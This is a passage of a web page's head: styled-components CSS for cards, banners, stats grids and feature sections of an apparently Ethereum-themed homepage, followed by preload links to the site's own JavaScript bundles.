        align-items: flex-start;
        overflow: visible;
        width: 100%;
        -webkit-box-flex: 1;
        -webkit-flex-grow: 1;
        -ms-flex-positive: 1;
        flex-grow: 1;
      }

      /*!sc*/
      data-styled.g154[id="Layout__Main-sc-19910io-3"] {
        content: "dliKfQ,"
      }

      /*!sc*/
      .fOVdDV {
        padding: 1.5rem;
      }

      /*!sc*/
      data-styled.g164[id="ActionCard__Content-sc-gy4g5e-0"] {
        content: "fOVdDV,"
      }

      /*!sc*/
      .kEexQS {
        opacity: 0.8;
        margin-bottom: 0rem;
      }

      /*!sc*/
      data-styled.g165[id="ActionCard__Description-sc-gy4g5e-1"] {
        content: "kEexQS,"
      }

      /*!sc*/
      .cLArJv {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: row;
        -ms-flex-direction: row;
        flex-direction: row;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
        -webkit-align-items: flex-end;
        -webkit-box-align: flex-end;
        -ms-flex-align: flex-end;
        align-items: flex-end;
        background: radial-gradient(46.28% 66.31% at 66.95% 58.35%, #e6e6f7 0%, #e7edfa 50%, #e9fbfa 100%);
        box-shadow: inset 0px -1px 0px rgba(0, 0, 0, 0.1);
        min-height: 260px;
      }

      /*!sc*/
      data-styled.g167[id="ActionCard__ImageWrapper-sc-gy4g5e-3"] {
        content: "cLArJv,"
      }

      /*!sc*/
      .gtOVKq {
        margin-top: 0.5rem;
        margin-bottom: 1rem;
      }

      /*!sc*/
      data-styled.g168[id="ActionCard__Title-sc-gy4g5e-4"] {
        content: "gtOVKq,"
      }

      /*!sc*/
      .cIcvKa {
        width: 100%;
        height: 100%;
        min-width: 100px;
        min-height: 100px;
        max-width: 372px;
        max-height: 257px;
      }

      /*!sc*/
      @media (max-width:414px) {
        .cIcvKa {
          max-width: 311px;
        }
      }

      /*!sc*/
      data-styled.g169[id="ActionCard__Image-sc-gy4g5e-5"] {
        content: "cIcvKa,"
      }

      /*!sc*/
      .jZiAML {
        -webkit-text-decoration: none;
        text-decoration: none;
        -webkit-flex: 1 1 372px;
        -ms-flex: 1 1 372px;
        flex: 1 1 372px;
        color: #333;
        box-shadow: 0px 14px 66px rgba(0, 0, 0, 0.07), 0px 10px 17px rgba(0, 0, 0, 0.03), 0px 4px 7px rgba(0, 0, 0, 0.05);
        margin: 1rem;
      }

      /*!sc*/
      .jZiAML:hover,
      .jZiAML:focus {
        border-radius: 4px;
        box-shadow: 0px 8px 17px rgba(0, 0, 0, 0.15);
        background: #f2f2f2;
        -webkit-transition: -webkit-transform 0.1s;
        -webkit-transition: transform 0.1s;
        transition: transform 0.1s;
        -webkit-transform: scale(1.02);
        -ms-transform: scale(1.02);
        transform: scale(1.02);
      }

      /*!sc*/
      data-styled.g170[id="ActionCard__Card-sc-gy4g5e-6"] {
        content: "jZiAML,"
      }

      /*!sc*/
      .HCTlz {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: row-reverse;
        -ms-flex-direction: row-reverse;
        flex-direction: row-reverse;
        background: linear-gradient(49.21deg, rgba(127, 127, 213, 0.2) 19.87%, rgba(134, 168, 231, 0.2) 58.46%, rgba(145, 234, 228, 0.2) 97.05%);
        padding: 3rem;
        margin: 1rem;
        margin-top: 6rem;
        margin-bottom: 10rem;
        border-radius: 4px;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .HCTlz {
          -webkit-flex-direction: column;
          -ms-flex-direction: column;
          flex-direction: column;
          margin-bottom: 1rem;
          margin: 4rem 2rem;
        }
      }

      /*!sc*/
      @media (max-width:414px) {
        .HCTlz {
          padding: 2rem;
        }
      }

      /*!sc*/
      data-styled.g412[id="CalloutBanner__StyledCard-sc-gj8rbv-0"] {
        content: "HCTlz,"
      }

      /*!sc*/
      .hatxbg {
        padding-left: 5rem;
        -webkit-flex: 1 0 50%;
        -ms-flex: 1 0 50%;
        flex: 1 0 50%;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .hatxbg {
          margin-top: 2rem;
          padding-left: 1rem;
          -webkit-flex-direction: column;
          -ms-flex-direction: column;
          flex-direction: column;
          width: 100%;
        }
      }

      /*!sc*/
      @media (max-width:414px) {
        .hatxbg {
          padding-left: 0;
        }
      }

      /*!sc*/
      data-styled.g413[id="CalloutBanner__Content-sc-gj8rbv-1"] {
        content: "hatxbg,"
      }

      /*!sc*/
      .ilbaeg {
        font-size: 1.25rem;
        width: 90%;
        line-height: 140%;
        margin-bottom: 2rem;
        color: #666;
      }

      /*!sc*/
      data-styled.g414[id="CalloutBanner__Description-sc-gj8rbv-2"] {
        content: "ilbaeg,"
      }

      /*!sc*/
      .eugKcz {
        -webkit-align-self: center;
        -ms-flex-item-align: center;
        align-self: center;
        width: 100%;
        max-width: 600px;
        margin-top: -6rem;
        margin-bottom: -6rem;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .eugKcz {
          margin-bottom: 0rem;
          margin-top: -6rem;
        }
      }

      /*!sc*/
      data-styled.g415[id="CalloutBanner__Image-sc-gj8rbv-3"] {
        content: "eugKcz,"
      }

      /*!sc*/
      .gvPciB {
        margin-top: 0rem;
      }

      /*!sc*/
      data-styled.g416[id="CalloutBanner__H2-sc-gj8rbv-4"] {
        content: "gvPciB,"
      }

      /*!sc*/
      .hgBHBH {
        position: fixed;
        background: rgba(0, 0, 0, 0.7);
        will-change: opacity;
        top: 0;
        bottom: 0;
        left: 50%;
        -webkit-transform: translateX(-50%);
        -ms-transform: translateX(-50%);
        transform: translateX(-50%);
        width: 100%;
      }

      /*!sc*/
      data-styled.g573[id="CodeModal__StyledOverlay-sc-15m4x60-0"] {
        content: "hgBHBH,"
      }

      /*!sc*/
      .hNHXsg {
        -webkit-text-decoration: none;
        text-decoration: none;
        font-size: 1rem;
        color: #333;
      }

      /*!sc*/
      .hNHXsg:hover {
        color: rgb(28, 28, 225);
      }

      /*!sc*/
      .hNHXsg.active {
        font-weight: bold;
      }

      /*!sc*/
      data-styled.g580[id="Morpher__NavLink-sc-xfsyy9-0"] {
        content: "hNHXsg,"
      }

      /*!sc*/
      .fYaJvI {
        position: absolute;
        bottom: 8%;
        font-size: min(4.4vw, 4rem);
        font-weight: 600;
        margin-top: 0rem;
        margin-bottom: 1rem;
        color: #333;
        -webkit-flex-wrap: wrap;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
        text-overflow: ellipsis;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .fYaJvI {
          font-size: max(8.8vw, 48px);
        }
      }

      /*!sc*/
      data-styled.g591[id="StatsBoxGrid__Value-sc-f5d86h-0"] {
        content: "fYaJvI,"
      }

      /*!sc*/
      .iftUTZ {
        font-size: 1.25rem;
        margin-bottom: 0.5rem;
        color: #333;
        text-transform: uppercase;
        font-family: "SFMono-Regular", Consolas, "Roboto Mono", "Droid Sans Mono", "Liberation Mono", Menlo, Courier, monospace;
      }

      /*!sc*/
      data-styled.g592[id="StatsBoxGrid__Title-sc-f5d86h-1"] {
        content: "iftUTZ,"
      }

      /*!sc*/
      .gEKlHk {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        margin: 2rem 2rem 0;
        border-radius: 2px;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .gEKlHk {
          display: -webkit-box;
          display: -webkit-flex;
          display: -ms-flexbox;
          display: flex;
          -webkit-flex-direction: column;
          -ms-flex-direction: column;
          flex-direction: column;
          width: 100%;
          margin: 2rem 0 0;
        }
      }

      /*!sc*/
      @media (max-width:414px) {
        .gEKlHk {
          margin: 0;
        }
      }

      /*!sc*/
      data-styled.g593[id="StatsBoxGrid__Grid-sc-f5d86h-2"] {
        content: "gEKlHk,"
      }

      /*!sc*/
      .izdzbf {
        position: relative;
        color: #333;
        height: 20rem;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        -webkit-align-items: flex-start;
        -webkit-box-align: flex-start;
        -ms-flex-align: flex-start;
        align-items: flex-start;
        border: 1px solid;
        padding: 1.5rem;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .izdzbf {
          border-left: 0px solid #000000;
          border-right: 0px solid #000000;
          margin-top: -1px;
          padding: 1rem;
          padding-top: 2rem;
        }
      }

      /*!sc*/
      data-styled.g594[id="StatsBoxGrid__Box-sc-f5d86h-3"] {
        content: "izdzbf,"
      }

      /*!sc*/
      .iildjv {
        font-size: 2rem;
      }

      /*!sc*/
      data-styled.g597[id="StatsBoxGrid__IndicatorSpan-sc-f5d86h-6"] {
        content: "iildjv,"
      }

      /*!sc*/
      .eUQUVU {
        background-color: #fff;
        box-shadow: 0 14px 66px rgba(0, 0, 0, .07), 0 10px 17px rgba(0, 0, 0, .03), 0 4px 7px rgba(0, 0, 0, .05);
        width: 100%;
        margin-bottom: 2rem;
        border-radius: 2px;
      }

      /*!sc*/
      data-styled.g602[id="TitleCardList__Table-sc-10oh3h-0"] {
        content: "eUQUVU,"
      }

      /*!sc*/
      .hHaFmw {
        background: #f7f7f7;
        padding: 1rem;
        border-bottom: 1px solid #333;
        font-weight: 600;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: row-reverse;
        -ms-flex-direction: row-reverse;
        flex-direction: row-reverse;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
      }

      /*!sc*/
      data-styled.g603[id="TitleCardList__TableHeader-sc-10oh3h-1"] {
        content: "hHaFmw,"
      }

      /*!sc*/
      .dZTyOm:hover path {
        fill: transparent;
      }

      /*!sc*/
      data-styled.g604[id="TitleCardList__StyledIcon-sc-10oh3h-2"] {
        content: "dZTyOm,"
      }

      /*!sc*/
      .fCFoHG {
        cursor: pointer;
        -webkit-text-decoration: none;
        text-decoration: none;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        color: #333 !important;
        box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
        margin-bottom: 1px;
        padding: 1rem;
        width: 100%;
        color: #000;
      }

      /*!sc*/
      .fCFoHG:hover {
        box-shadow: 0 0 1px rgb(28, 28, 225);
        background: #d1d1f9;
        color: rgb(0, 0, 0) !important;
      }

      /*!sc*/
      data-styled.g605[id="TitleCardList__Item-sc-10oh3h-3"] {
        content: "fCFoHG,"
      }

      /*!sc*/
      .eQtyCR {
        font-size: 0.875rem;
        margin-bottom: 0;
        opacity: 0.7;
      }

      /*!sc*/
      data-styled.g608[id="TitleCardList__ItemDesc-sc-10oh3h-6"] {
        content: "eQtyCR,"
      }

      /*!sc*/
      .jKPjLU {
        -webkit-flex: 1 1 75%;
        -ms-flex: 1 1 75%;
        flex: 1 1 75%;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        margin-right: 2rem;
      }

      /*!sc*/
      data-styled.g609[id="TitleCardList__LeftContainer-sc-10oh3h-7"] {
        content: "jKPjLU,"
      }

      /*!sc*/
      .bUuoBA {
        border-radius: 64px;
        background: #d46666;
        margin-right: 0.5rem;
        width: 12px;
        height: 12px;
      }

      /*!sc*/
      data-styled.g612[id="TitleCardList__Red-sc-10oh3h-10"] {
        content: "bUuoBA,"
      }

      /*!sc*/
      .iZbXAN {
        border-radius: 64px;
        background: #FFE78E;
        margin-right: 0.5rem;
        width: 12px;
        height: 12px;
      }

      /*!sc*/
      data-styled.g613[id="TitleCardList__Yellow-sc-10oh3h-11"] {
        content: "iZbXAN,"
      }

      /*!sc*/
      .fQLMwI {
        border-radius: 64px;
        background: #6fc4a0;
        width: 12px;
        height: 12px;
      }

      /*!sc*/
      data-styled.g614[id="TitleCardList__Green-sc-10oh3h-12"] {
        content: "fQLMwI,"
      }

      /*!sc*/
      .dqvnkZ {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
      }

      /*!sc*/
      @media (max-width:414px) {
        .dqvnkZ {
          display: none;
        }
      }

      /*!sc*/
      data-styled.g615[id="TitleCardList__CodeBoxHeader-sc-10oh3h-13"] {
        content: "dqvnkZ,"
      }

      /*!sc*/
      .cZXymR {
        width: 100%;
        min-height: 380px;
        max-height: 440px;
        background-size: cover;
        background: no-repeat 50px;
        margin-bottom: 2rem;
      }

      /*!sc*/
      data-styled.g616[id="pages__Hero-sc-179z7qu-0"] {
        content: "cZXymR,"
      }

      /*!sc*/
      @media (max-width:1024px) {
        .bCrDps {
          padding: 1rem;
        }
      }

      /*!sc*/
      data-styled.g617[id="pages__StyledContent-sc-179z7qu-1"] {
        content: "bCrDps,"
      }

      /*!sc*/
      .kaFawG {
        font-size: 2.5rem;
        font-weight: 700;
        margin: 0;
        text-align: center;
      }

      /*!sc*/
      @media (max-width:414px) {
        .kaFawG {
          font-size: 2rem;
        }
      }

      /*!sc*/
      data-styled.g618[id="pages__H1-sc-179z7qu-2"] {
        content: "kaFawG,"
      }

      /*!sc*/
      .fiKxAO {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        width: 100%;
        margin: 0 auto;
      }

      /*!sc*/
      data-styled.g619[id="pages__Page-sc-179z7qu-3"] {
        content: "fiKxAO,"
      }

      /*!sc*/
      .iTVOax {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        margin-top: 1rem;
        margin-bottom: 2rem;
        padding: 0 2rem;
      }

      /*!sc*/
      data-styled.g620[id="pages__Header-sc-179z7qu-4"] {
        content: "iTVOax,"
      }

      /*!sc*/
      .gIRrJM {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: flex-start;
        -webkit-box-align: flex-start;
        -ms-flex-align: flex-start;
        align-items: flex-start;
        gap: 0.5rem;
      }

      /*!sc*/
      @media (max-width:768px) {
        .gIRrJM {
          -webkit-flex-direction: column;
          -ms-flex-direction: column;
          flex-direction: column;
        }
      }

      /*!sc*/
      data-styled.g621[id="pages__ButtonRow-sc-179z7qu-5"] {
        content: "gIRrJM,"
      }

      /*!sc*/
      .jUwQBm {
        gap: 0.5rem;
        margin-top: 0rem;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
      }

      /*!sc*/
      @media (max-width:768px) {
        .jUwQBm {
          margin-top: 1rem;
          margin-left: 0rem;
        }
      }

      /*!sc*/
      data-styled.g622[id="pages__StyledButtonLink-sc-179z7qu-6"] {
        content: "jUwQBm,"
      }

      /*!sc*/
      @media (max-width:414px) {
        .bSqhwG {
          padding: 1rem;
        }
      }

      /*!sc*/
      data-styled.g623[id="pages__CodeExampleContent-sc-179z7qu-7"] {
        content: "bSqhwG,"
      }

      /*!sc*/
      .bFeOvs .modal-component-container {
        padding: 0;
        left: 0;
        right: 0;
        bottom: 0;
        top: 50%;
      }

      /*!sc*/
      .bFeOvs .modal-component {
        max-width: 100%;
        max-height: 50%;
        padding: 0rem;
      }

      /*!sc*/
      .bFeOvs .modal-component-content {
        margin-top: 3rem;
        width: 100%;
        overflow: auto;
      }

      /*!sc*/
      data-styled.g624[id="pages__CodeboxModal-sc-179z7qu-8"] {
        content: "bFeOvs,"
      }

      /*!sc*/
      .cHKWg {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        margin-bottom: 3rem;
        margin-top: 1rem;
      }

      /*!sc*/
      @media (max-width:768px) {
        .cHKWg {
          -webkit-flex-direction: column-reverse;
          -ms-flex-direction: column-reverse;
          flex-direction: column-reverse;
          margin: 0rem;
        }
      }

      /*!sc*/
      data-styled.g625[id="pages__IntroRow-sc-179z7qu-9"] {
        content: "cHKWg,"
      }

      /*!sc*/
      .diiBgM {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: row-reverse;
        -ms-flex-direction: row-reverse;
        flex-direction: row-reverse;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .diiBgM {
          -webkit-flex-direction: column-reverse;
          -ms-flex-direction: column-reverse;
          flex-direction: column-reverse;
          -webkit-align-items: center;
          -webkit-box-align: center;
          -ms-flex-align: center;
          align-items: center;
        }
      }

      /*!sc*/
      data-styled.g626[id="pages__RowReverse-sc-179z7qu-10"] {
        content: "diiBgM,"
      }

      /*!sc*/
      .cYDWJt {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: row;
        -ms-flex-direction: row;
        flex-direction: row;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .cYDWJt {
          -webkit-flex-direction: column-reverse;
          -ms-flex-direction: column-reverse;
          flex-direction: column-reverse;
          -webkit-align-items: center;
          -webkit-box-align: center;
          -ms-flex-align: center;
          align-items: center;
        }
      }

      /*!sc*/
      data-styled.g627[id="pages__Row-sc-179z7qu-11"] {
        content: "cYDWJt,"
      }

      /*!sc*/
      .bCskZk {
        background: "#F1FFFD";
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        height: 100%;
        width: 100%;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .bCskZk {
          width: 75%;
        }
      }

      /*!sc*/
      data-styled.g628[id="pages__ImageContainer-sc-179z7qu-12"] {
        content: "bCskZk,"
      }

      /*!sc*/
      .hIfFRV {
        color: #666;
        max-width: 55ch;
        text-align: center;
        -webkit-align-self: center;
        -ms-flex-item-align: center;
        align-self: center;
        font-size: 1.25rem;
        margin-top: 1rem;
      }

      /*!sc*/
      data-styled.g629[id="pages__Description-sc-179z7qu-13"] {
        content: "hIfFRV,"
      }

      /*!sc*/
      .iBaFdM {
        box-shadow: inset 0px 0px 0px rgba(0, 0, 0, 0.1);
        padding: 0rem;
        padding-bottom: 4rem;
        margin-top: 0rem;
      }

      /*!sc*/
      data-styled.g630[id="pages__StyledGrayContainer-sc-179z7qu-14"] {
        content: "iBaFdM,"
      }

      /*!sc*/
      .gvgshY {
        min-width: 480px;
        margin: 1rem;
        border-radius: 2px;
        border: 1px solid #333;
        background: #fff;
        box-shadow: 4px 4px 0px 0px #D2D2F9;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .gvgshY {
          margin: 0;
          min-width: min(100%, 240px);
        }
      }

      /*!sc*/
      data-styled.g631[id="pages__StyledCard-sc-179z7qu-15"] {
        content: "gvgshY,"
      }

      /*!sc*/
      .jNrXCG {
        min-width: 400px;
        margin: 1rem;
        border-radius: 2px;
        border: 1px solid #333;
        background: #fff;
        box-shadow: 4px 4px 0px 0px #D2D2F9;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .jNrXCG {
          margin: 0;
          min-width: min(100%, 240px);
        }
      }

      /*!sc*/
      data-styled.g632[id="pages__Tout-sc-179z7qu-16"] {
        content: "jNrXCG,"
      }

      /*!sc*/
      .kTUIwR {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-wrap: wrap;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
        -webkit-box-pack: justify;
        -webkit-justify-content: space-between;
        -ms-flex-pack: justify;
        justify-content: space-between;
        width: 100%;
        margin: 0rem;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .kTUIwR {
          display: grid;
          gap: 2rem;
          grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
          grid-template-columns: 1fr;
        }
      }

      /*!sc*/
      data-styled.g633[id="pages__StyledCardContainer-sc-179z7qu-17"] {
        content: "kTUIwR,"
      }

      /*!sc*/
      .gMJurh {
        width: 100%;
        background-size: cover;
        background: no-repeat 50px;
      }

      /*!sc*/
      data-styled.g634[id="pages__IntroImage-sc-179z7qu-18"] {
        content: "gMJurh,"
      }

      /*!sc*/
      .MDGZx {
        width: 100%;
      }

      /*!sc*/
      data-styled.g635[id="pages__FeatureImage-sc-179z7qu-19"] {
        content: "MDGZx,"
      }

      /*!sc*/
      .cDXHGL {
        margin-bottom: 2rem;
        font-size: 1.25rem;
        line-height: 140%;
      }

      /*!sc*/
      @media (max-width:414px) {
        .cDXHGL {
          font-size: 1rem;
        }
      }

      /*!sc*/
      data-styled.g636[id="pages__Subtitle-sc-179z7qu-20"] {
        content: "cDXHGL,"
      }

      /*!sc*/
      .hdqQWl {
        background: #CCFCFF;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-flex-direction: row-reverse;
        -ms-flex-direction: row-reverse;
        flex-direction: row-reverse;
        padding-left: 2rem;
        width: 100%;
        height: 720px;
        margin-top: -1px;
        border-top: 1px solid #333;
        border-bottom: 1px solid #333;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .hdqQWl {
          -webkit-flex-direction: column-reverse;
          -ms-flex-direction: column-reverse;
          flex-direction: column-reverse;
          height: 100%;
          padding-top: 2rem;
          padding-left: 0rem;
          padding-bottom: 2rem;
        }
      }

      /*!sc*/
      data-styled.g637[id="pages__EthereumIntroContainer-sc-179z7qu-21"] {
        content: "hdqQWl,"
      }

      /*!sc*/
      .wJuNn {
        background: #ffe3d3;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-flex-direction: row;
        -ms-flex-direction: row;
        flex-direction: row;
        width: 100%;
        height: 720px;
        margin-top: -1px;
        border-top: 1px solid #333;
        border-bottom: 1px solid #333;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .wJuNn {
          -webkit-flex-direction: column-reverse;
          -ms-flex-direction: column-reverse;
          flex-direction: column-reverse;
          height: 100%;
          height: 100%;
          padding-top: 2rem;
          padding-right: 0rem;
          padding-bottom: 2rem;
        }
      }

      /*!sc*/
      data-styled.g638[id="pages__FinanceContainer-sc-179z7qu-22"] {
        content: "wJuNn,"
      }

      /*!sc*/
      .itaOEL {
        background: #E1FEFA;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-flex-direction: row;
        -ms-flex-direction: row;
        flex-direction: row;
        width: 100%;
        height: 720px;
        margin-top: -1px;
        border-top: 1px solid #333;
        border-bottom: 1px solid #333;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .itaOEL {
          -webkit-flex-direction: column-reverse;
          -ms-flex-direction: column-reverse;
          flex-direction: column-reverse;
          height: 100%;
          height: 100%;
          padding-top: 2rem;
          padding-right: 0rem;
          padding-bottom: 2rem;
        }
      }

      /*!sc*/
      data-styled.g639[id="pages__NftContainer-sc-179z7qu-23"] {
        content: "itaOEL,"
      }

      /*!sc*/
      .kbxyPU {
        background: #FFE5F9;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-flex-direction: row-reverse;
        -ms-flex-direction: row-reverse;
        flex-direction: row-reverse;
        padding-left: 2rem;
        height: 720px;
        width: 100%;
        margin-top: -1px;
        margin-bottom: 0rem;
        border-top: 1px solid #333;
        border-bottom: 1px solid #333;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .kbxyPU {
          -webkit-flex-direction: column-reverse;
          -ms-flex-direction: column-reverse;
          flex-direction: column-reverse;
          height: 100%;
          padding-top: 2rem;
          padding-left: 0rem;
          padding-bottom: 2rem;
        }
      }

      /*!sc*/
      data-styled.g640[id="pages__InternetContainer-sc-179z7qu-24"] {
        content: "kbxyPU,"
      }

      /*!sc*/
      .hXcjPG {
        background: #e8e8fc;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-flex-direction: row;
        -ms-flex-direction: row;
        flex-direction: row;
        height: 720px;
        width: 100%;
        margin-top: -1px;
        border-top: 1px solid #333;
        border-bottom: 1px solid #333;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .hXcjPG {
          -webkit-flex-direction: column-reverse;
          -ms-flex-direction: column-reverse;
          flex-direction: column-reverse;
          height: 100%;
        }
      }

      /*!sc*/
      data-styled.g641[id="pages__DeveloperContainer-sc-179z7qu-25"] {
        content: "hXcjPG,"
      }

      /*!sc*/
      .kuhKTy {
        padding: 6rem;
        height: 100%;
        width: 100%;
        margin: 0;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .kuhKTy {
          padding: 2rem;
        }
      }

      /*!sc*/
      data-styled.g642[id="pages__FeatureContent-sc-179z7qu-26"] {
        content: "kuhKTy,"
      }

      /*!sc*/
      .eJJieU {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-box-pack: center;
        -webkit-justify-content: center;
        -ms-flex-pack: center;
        justify-content: center;
      }

      /*!sc*/
      data-styled.g643[id="pages__LeftColumnContent-sc-179z7qu-27"] {
        content: "eJJieU,"
      }

      /*!sc*/
      .cDElfY {
        padding: 6rem;
        height: 100%;
        width: 100%;
        margin: 0;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .cDElfY {
          padding: 2rem;
        }
      }

      /*!sc*/
      @media (max-width:414px) {
        .cDElfY {
          padding: 0rem;
        }
      }

      /*!sc*/
      data-styled.g644[id="pages__IntroLeftColumn-sc-179z7qu-28"] {
        content: "cDElfY,"
      }

      /*!sc*/
      .iUTeOT {
        fill: #333;
      }

      /*!sc*/
      @media (max-width:1024px) {}

      /*!sc*/
      .iUTeOT:hover {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      .iUTeOT:active {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      .iUTeOT:focus {
        fill: rgb(28, 28, 225);
      }

      /*!sc*/
      data-styled.g645[id="pages__StyledIcon-sc-179z7qu-29"] {
        content: "iUTeOT,"
      }

      /*!sc*/
      .eYfbOD {
        margin: 0 0 1.5rem;
      }

      /*!sc*/
      data-styled.g646[id="pages__H2-sc-179z7qu-30"] {
        content: "eYfbOD,"
      }

      /*!sc*/
      .Ddgiy {
        margin-bottom: 0.5rem;
        font-family: serif;
      }

      /*!sc*/
      @media (max-width:414px) {
        .Ddgiy {
          font-size: 1.5rem;
        }
      }

      /*!sc*/
      data-styled.g647[id="pages__StyledH2-sc-179z7qu-31"] {
        content: "Ddgiy,"
      }

      /*!sc*/
      .gKWMSB {
        margin-left: 4rem;
        max-width: 624px;
        border: 1px solid #333;
        box-shadow: 4px 4px 0px 0px #D2D2F9;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .gKWMSB {
          margin-left: 0rem;
          max-width: 100%;
        }
      }

      /*!sc*/
      data-styled.g648[id="pages__StyledCardList-sc-179z7qu-32"] {
        content: "gKWMSB,"
      }

      /*!sc*/
      .hYJHgM {
        margin: 8rem 0 4rem;
        padding: 2rem 4rem;
      }

      /*!sc*/
      @media (max-width:1024px) {
        .hYJHgM {
          margin-bottom: 4rem;
          padding: 2rem;
        }
      }

      /*!sc*/
      data-styled.g649[id="pages__StyledCalloutBanner-sc-179z7qu-33"] {
        content: "hYJHgM,"
      }

      .handsome {
        opacity:1;
        display:none;
      }

      /*!sc*/
    </style>
    <link as="script" rel="preload" href="/webpack-runtime-da26d554e03be4ff9a68.js" />
    <link as="script" rel="preload" href="/framework-4e285adfb333f1b50c05.js" />
    <link as="script" rel="preload" href="/252f366e-2705b607be296edabcea.js" />
    <link as="script" rel="preload" href="/ae51ba48-34d54094a2c04f215fb8.js" />
    <link as="script" rel="preload" href="/1bfc9850-0f18e2d74feedfc6e426.js" />
    <link as="script" rel="preload" href="/0c428ae2-2128ff22fce458b543bd.js" />
    <link as="script" rel="preload" href="/0f1ac474-e8f788f62189f421a856.js" />
    <link as="script" rel="preload" href="/app-28078d89f9db9418b96d.js" />
